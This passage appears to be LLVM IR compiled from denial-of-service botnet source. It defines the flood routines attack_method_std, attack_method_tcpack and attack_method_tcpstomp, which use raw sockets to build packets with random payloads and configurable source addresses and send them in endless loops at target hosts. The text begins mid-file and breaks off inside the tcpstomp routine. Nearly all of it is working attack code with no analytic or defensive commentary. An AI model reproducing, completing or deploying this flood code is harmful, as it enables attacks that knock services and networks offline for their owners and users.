declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #11
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #12
  %56 = call i32 @htonl(i32 %55) #12
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = icmp eq i8 %16, 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.160 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.160 to i64
  %64 = getelementptr inbounds i8*, i8** %8, i64 %63
  %65 = load i8*, i8** %64, align 8
  br i1 %62, label %67, label %66

; <label>:66:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %65, i32 %.mask)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %66
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %65, i64 %34, i32 16384) #11
  %71 = add nsw i32 %.160, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %190, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  %..v = select i1 %69, i16 80, i16 2128
  %. = or i16 %68, %..v
  br label %87

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #11
  br label %190

.preheader.loopexit:                              ; preds = %106
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i32 %39, -1
  %73 = and i32 %11, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %17, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %19, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = icmp eq i32 %21, 65535
  %80 = icmp eq i32 %22, 65535
  %81 = icmp eq i8 %37, 0
  %82 = sext i32 %35 to i64
  %83 = add nsw i64 %82, 20
  %84 = trunc i64 %83 to i16
  %85 = trunc i64 %83 to i32
  %86 = add nsw i64 %82, 40
  br label %.loopexit

; <label>:87:                                     ; preds = %.lr.ph129, %106
  %88 = phi i32 [ 0, %.lr.ph129 ], [ %126, %106 ]
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  store i8* %89, i8** %91, align 8
  %92 = getelementptr inbounds i8, i8* %89, i64 20
  %93 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %94 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %94, align 1
  %95 = call zeroext i16 @htons(i16 zeroext %49) #12
  %96 = getelementptr inbounds i8, i8* %89, i64 2
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %12) #12
  %99 = getelementptr inbounds i8, i8* %89, i64 4
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 4
  %101 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %101, align 4
  br i1 %50, label %106, label %102

; <label>:102:                                    ; preds = %87
  %103 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %104 = getelementptr inbounds i8, i8* %89, i64 6
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %87, %102
  %107 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %107, align 1
  %108 = getelementptr inbounds i8, i8* %89, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 %39, i32* %109, align 4
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %111 = load i32, i32* %110, align 4
  %112 = getelementptr inbounds i8, i8* %89, i64 16
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = call zeroext i16 @htons(i16 zeroext %18) #12
  %115 = bitcast i8* %92 to i16*
  store i16 %114, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext %20) #12
  %117 = getelementptr inbounds i8, i8* %89, i64 22
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %51) #12
  %120 = zext i16 %119 to i32
  %121 = getelementptr inbounds i8, i8* %89, i64 24
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = getelementptr inbounds i8, i8* %89, i64 32
  %124 = bitcast i8* %123 to i16*
  store i16 %., i16* %124, align 4
  call void @rand_str(i8* nonnull %93, i32 %35)
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %5, align 4
  %127 = icmp slt i32 %126, %46
  br i1 %127, label %87, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %169
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %169
  %storemerge121128 = phi i32 [ %188, %169 ], [ 0, %.lr.ph.preheader ]
  %128 = sext i32 %storemerge121128 to i64
  %129 = getelementptr inbounds i8*, i8** %8, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %130, i64 20
  %133 = getelementptr inbounds i8, i8* %130, i64 40
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #12
  %141 = call i32 @htonl(i32 %140) #12
  %142 = getelementptr inbounds i8, i8* %130, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %72, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %130, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %74, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %130, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %76, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %132 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %78, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %130, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %79, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %130, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %80, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %130, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %81, label %169, label %168

; <label>:168:                                    ; preds = %167
  call void @rand_str(i8* %133, i32 %35)
  %.pre = load i32, i32* %5, align 4
  br label %169

; <label>:169:                                    ; preds = %167, %168
  %170 = phi i32 [ %storemerge121128, %167 ], [ %.pre, %168 ]
  %171 = getelementptr inbounds i8, i8* %130, i64 10
  %172 = bitcast i8* %171 to i16*
  store i16 0, i16* %172, align 2
  %173 = bitcast i8* %130 to i16*
  %174 = call zeroext i16 @checksum_generic(i16* %173, i32 20)
  store i16 %174, i16* %172, align 2
  %175 = getelementptr inbounds i8, i8* %130, i64 36
  %176 = bitcast i8* %175 to i16*
  store i16 0, i16* %176, align 4
  %177 = call zeroext i16 @htons(i16 zeroext %84) #12
  %178 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %131, i8* %132, i16 zeroext %177, i32 %85)
  store i16 %178, i16* %176, align 4
  %179 = getelementptr inbounds i8, i8* %130, i64 22
  %180 = bitcast i8* %179 to i16*
  %181 = load i16, i16* %180, align 2
  %182 = sext i32 %170 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %40, i8* %130, i64 %86, i32 16384, %struct.sockaddr* %185, i32 16) #11
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %46
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre165 = sext i32 %37 to i64
  %.pre166 = add nsw i64 %.pre165, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi167 = phi i64 [ %.pre166, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre165, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = add nsw i64 %.pre-phi, 20
  %90 = trunc i64 %89 to i16
  %91 = trunc i64 %89 to i32
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %92 = phi i32 [ %187, %.backedge ], [ %84, %.lr.ph161.preheader ]
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0) #11
  %94 = or i32 %93, 2048
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 4, i32 %94) #11
  store i16 2, i16* %48, align 4
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 1
  %102 = load i32, i32* %101, align 4
  br i1 %100, label %103, label %106

; <label>:103:                                    ; preds = %.lr.ph161
  %104 = call i32 @ntohl(i32 %102) #12
  %105 = call i32 @htonl(i32 %104) #12
  br label %106

; <label>:106:                                    ; preds = %.lr.ph161, %103
  %.sink = phi i32 [ %105, %103 ], [ %102, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %109, label %107

; <label>:107:                                    ; preds = %106
  %108 = call zeroext i16 @htons(i16 zeroext %24) #12
  br label %109

; <label>:109:                                    ; preds = %106, %107
  %.sink3 = phi i16 [ %108, %107 ], [ 0, %106 ]
  store i16 %.sink3, i16* %52, align 2
  %110 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %53, i32 16) #11
  %111 = call i64 @time(i64* null) #11
  br label %112

; <label>:112:                                    ; preds = %189, %109
  store i32 16, i32* %8, align 4
  %113 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %114 = trunc i64 %113 to i32
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit150.loopexit, label %116

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %56, align 4
  %118 = load i32, i32* %49, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %189

; <label>:120:                                    ; preds = %116
  %sext = shl i64 %113, 32
  %121 = ashr exact i64 %sext, 32
  %122 = icmp ugt i64 %121, 40
  br i1 %122, label %123, label %189

; <label>:123:                                    ; preds = %120
  %124 = load i16, i16* %58, align 4
  %125 = load i16, i16* %52, align 2
  %126 = icmp eq i16 %124, %125
  br i1 %126, label %127, label %189

; <label>:127:                                    ; preds = %123
  %128 = load i16, i16* %60, align 16
  %129 = and i16 %128, 4608
  %130 = icmp eq i16 %129, 4608
  br i1 %130, label %131, label %182

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 0
  store i32 %117, i32* %134, align 4
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %136 = load i32, i32* %135, align 4
  %137 = call i32 @ntohl(i32 %136) #12
  %138 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 1
  store i32 %137, i32* %138, align 4
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #12
  %142 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 2
  store i32 %141, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %144 = load i16, i16* %143, align 2
  %145 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 3
  store i16 %144, i16* %145, align 4
  %146 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %133, i32 4
  store i16 %124, i16* %146, align 2
  %147 = call noalias i8* @malloc(i64 %62) #11
  %148 = getelementptr inbounds i8*, i8** %14, i64 %133
  store i8* %147, i8** %148, align 8
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  %151 = getelementptr inbounds i8, i8* %147, i64 40
  store i8 69, i8* %147, align 4
  %152 = getelementptr inbounds i8, i8* %147, i64 1
  store i8 %16, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %63) #12
  %154 = getelementptr inbounds i8, i8* %147, i64 2
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %18) #12
  %157 = getelementptr inbounds i8, i8* %147, i64 4
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %147, i64 8
